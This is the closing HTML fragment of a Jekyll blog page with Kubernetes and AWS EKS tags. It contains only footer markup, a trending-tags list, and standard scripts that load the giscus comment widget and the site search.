href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a>.</p></footer></div></div><div id="search-result-wrapper" class="d-flex justify-content-center d-none"><div class="col-11 content"><div id="search-hints"><section><h2 class="panel-heading">Trending Tags</h2><div class="d-flex flex-wrap mt-3 mb-1 me-3"> <a class="post-tag btn btn-outline-primary" href="/tags/kubernetes/">kubernetes</a> <a class="post-tag btn btn-outline-primary" href="/tags/k8s/">k8s</a> <a class="post-tag btn btn-outline-primary" href="/tags/amazon-eks/">Amazon EKS</a> <a class="post-tag btn btn-outline-primary" href="/tags/eksctl/">eksctl</a> <a class="post-tag btn btn-outline-primary" href="/tags/security/">security</a> <a class="post-tag btn btn-outline-primary" href="/tags/cert-manager/">cert-manager</a> <a class="post-tag btn btn-outline-primary" href="/tags/external-dns/">external-dns</a> <a class="post-tag btn btn-outline-primary" href="/tags/amazon-eks/">amazon eks</a> <a class="post-tag btn btn-outline-primary" href="/tags/oauth2-proxy/">oauth2-proxy</a> <a class="post-tag btn btn-outline-primary" href="/tags/podinfo/">podinfo</a></div></section></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><aside aria-label="Scroll to Top"> <button id="back-to-top" type="button" class="btn btn-lg btn-box-shadow"> <i class="fas fa-angle-up"></i> </button></aside></div><div id="mask" class="d-none position-fixed w-100 h-100 z-1"></div><aside id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-bs-animation="true" data-bs-autohide="false" ><div class="toast-header"> <button type="button" class="btn-close ms-auto" data-bs-dismiss="toast" aria-label="Close" ></button></div><div class="toast-body text-center pt-0"><p class="px-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></aside><script> (function () { const themeMapper = Theme.getThemeMapper('light', 'dark_dimmed'); const initTheme = themeMapper[Theme.visualState]; let lang = 'en';if (lang.length > 2 && !lang.startsWith('zh')) { lang = lang.slice(0, 2); } let giscusAttributes = { src: 'https://giscus.app/client.js', 'data-repo': 'ruzickap/ruzickap.github.io', 'data-repo-id': 'R_kgDOGkp4nQ', 'data-category': 'General', 'data-category-id': 'DIC_kwDOGkp4nc4CSdu1', 'data-mapping': 'pathname', 'data-strict' : '0', 'data-reactions-enabled': '1', 'data-emit-metadata': '0', 'data-theme': initTheme, 'data-input-position': 'bottom', 'data-lang': lang, 'data-loading': 'lazy', crossorigin: 'anonymous', async: '' }; let giscusNode = document.createElement('script'); Object.entries(giscusAttributes).forEach(([key, value]) => giscusNode.setAttribute(key, value) ); const $footer = document.querySelector('footer'); $footer.insertAdjacentElement("beforebegin", giscusNode); addEventListener('message', (event) => { if (event.source === window && event.data && event.data.id === Theme.ID) { const newTheme = themeMapper[Theme.visualState]; const message = { setConfig: { theme: newTheme } }; const giscus = document.getElementsByClassName('giscus-frame')[0].contentWindow; giscus.postMessage({ giscus: message }, 'https://giscus.app'); } }); })(); </script> <script> document.addEventListener('DOMContentLoaded', () => { SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<article class="px-1 px-sm-2 px-lg-4 px-xl-0"><header><h2><a href="{url}">{title}</a></h2><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div></header><p>{content}</p></article>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); }); </script>
